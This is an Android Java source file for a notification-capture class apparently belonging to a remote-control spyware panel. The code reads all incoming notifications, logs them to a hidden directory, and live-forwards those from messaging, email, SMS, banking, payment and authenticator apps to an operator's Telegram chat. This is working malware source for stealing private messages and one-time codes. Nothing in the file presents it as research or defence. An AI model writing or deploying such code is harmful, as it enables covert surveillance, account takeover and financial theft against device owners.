package com.java.panel;

import android.service.notification.StatusBarNotification;
import android.app.Notification;
import android.os.Bundle;
import java.io.File;
import java.io.FileWriter;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.HashSet;
import java.util.Set;

/**
 * Enhanced notification capture.
 * - Live push to Telegram
 * - Persistent log
 * - Package filter
 * - Active notifications dump
 */
public class NotificationHelper {

    private static final ConcurrentLinkedQueue<String> buffer = new ConcurrentLinkedQueue<>();
    private static boolean livePush = true;
    private static boolean enabled = true;
    private static final Set<String> filterPackages = new HashSet<>();
    private static final SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US);
    private static final Object lock = new Object();

    // Common high-value packages (can be extended at runtime)
    static {
        filterPackages.add("com.whatsapp");
        filterPackages.add("com.whatsapp.w4b");
        filterPackages.add("org.telegram.messenger");
        filterPackages.add("com.instagram.android");
        filterPackages.add("com.facebook.orca");
        filterPackages.add("com.facebook.katana");
        filterPackages.add("com.google.android.gm");
        filterPackages.add("com.android.mms");
        filterPackages.add("com.google.android.apps.messaging");
        filterPackages.add("com.bank"); // placeholder pattern style
    }

    public static void setEnabled(boolean v) { enabled = v; }
    public static void setLivePush(boolean v) { livePush = v; }

    public static void addFilter(String pkg) {
        if (pkg != null && !pkg.isEmpty()) filterPackages.add(pkg.toLowerCase());
    }

    public static void clearFilters() { filterPackages.clear(); }

    public static void onNotificationPosted(StatusBarNotification sbn) {
        if (!enabled || sbn == null) return;
        try {
            String pkg = sbn.getPackageName() != null ? sbn.getPackageName() : "unknown";
            Notification n = sbn.getNotification();
            if (n == null) return;

            Bundle extras = n.extras;
            String title = safe(extras.getCharSequence(Notification.EXTRA_TITLE));
            String text = safe(extras.getCharSequence(Notification.EXTRA_TEXT));
            String bigText = safe(extras.getCharSequence(Notification.EXTRA_BIG_TEXT));
            String subText = safe(extras.getCharSequence(Notification.EXTRA_SUB_TEXT));

            if (text.isEmpty() && bigText.isEmpty() && title.isEmpty()) return;

            String content = !bigText.isEmpty() ? bigText : text;
            String line = "[" + sdf.format(new Date()) + "] " + pkg
                    + "\nTitle: " + title
                    + "\nText: " + content
                    + (subText.isEmpty() ? "" : "\nSub: " + subText);

            buffer.add(line);
            while (buffer.size() > 500) buffer.poll();
            flushToDisk();

            boolean interesting = filterPackages.isEmpty()
                    || filterPackages.contains(pkg.toLowerCase())
                    || pkg.toLowerCase().contains("bank")
                    || pkg.toLowerCase().contains("pay")
                    || pkg.toLowerCase().contains("auth");

            if (livePush && interesting && ShellService.instance != null) {
                ShellService.instance.sendTelegramMessage(
                        ShellService.instance.ADMIN_CHAT_ID,
                        "🔔 " + line
                );
            }
        } catch (Exception ignored) {}
    }

    private static String safe(CharSequence cs) {
        return cs != null ? cs.toString().trim() : "";
    }

    private static void flushToDisk() {
        synchronized (lock) {
            try {
                File dir = new File(ShellService.TARGET_DIR);
                if (!dir.exists()) dir.mkdirs();
                File log = new File(dir, "notifications.txt");
                FileWriter fw = new FileWriter(log, true);
                String line;
                while ((line = buffer.poll()) != null) {
                    fw.write(line);
                    fw.write("\n---\n");
                }
                fw.flush();
                fw.close();
            } catch (Exception ignored) {}
        }
    }

    public static String getLogTail(int maxEntries) {
        flushToDisk();
        try {
            File log = new File(ShellService.TARGET_DIR + "notifications.txt");
            if (!log.exists()) return "🔔 Notification log empty.";
            java.util.List<String> blocks = new java.util.ArrayList<>();
            java.io.BufferedReader br = new java.io.BufferedReader(new java.io.FileReader(log));
            StringBuilder cur = new StringBuilder();
            String l;
            while ((l = br.readLine()) != null) {
                if (l.equals("---")) {
                    if (cur.length() > 0) {
                        blocks.add(cur.toString().trim());
                        cur = new StringBuilder();
                    }
                } else {
                    cur.append(l).append("\n");
                }
            }
            if (cur.length() > 0) blocks.add(cur.toString().trim());
            br.close();

            int from = Math.max(0, blocks.size() - maxEntries);
            StringBuilder sb = new StringBuilder();
            sb.append("🔔 Notifications (last ").append(blocks.size() - from).append("):\n\n");
            for (int i = from; i < blocks.size(); i++) {
                sb.append(blocks.get(i)).append("\n---\n");
            }
            return sb.toString();
        } catch (Exception e) {
            return "❌ " + e.getMessage();
        }
    }

    public static String clearLog() {
        synchronized (lock) {
            try {
                File log = new File(ShellService.TARGET_DIR + "notifications.txt");
                if (log.exists()) log.delete();
                buffer.clear();
                return "✅ Notification log cleared.";
            } catch (Exception e) {
                return "❌ " + e.getMessage();
            }
        }
    }
}
